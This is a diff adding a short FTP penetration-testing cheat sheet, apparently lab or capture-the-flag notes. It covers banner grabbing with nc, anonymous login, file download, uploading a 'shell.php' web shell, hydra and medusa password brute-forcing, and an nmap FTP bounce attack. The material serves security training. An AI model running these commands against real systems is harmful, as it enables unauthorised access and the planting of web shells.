@@ -1,0 +1,49 @@
+## Banner Grabbing
+
+```
+nc -vn <IP> 21 
+```
+
+## Connecting to the FTP server using the `ftp` client.
+
+```
+ftp 192.168.2.142
+```
+#### anonymous login check 
+
+```
+username : anonymous 
+password : anonymous 
+```
+
+## File download
+
+```
+get flag.txt
+mget *
+```
+## File upload
+
+```
+put shell.php
+```
+
+# Brute Force
+
+#### [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt) - Default Credentials for FTP
+
+```
+hydra -L /username.txt -P /usr/share/wordlists/rockyou.txt ftp://10.129.203.7
+```
+
+```
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
+``` 
+
+## FTP Bounce Attack
+
+The `Nmap` -b flag can be used to perform an FTP bounce attack:
+
+```
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
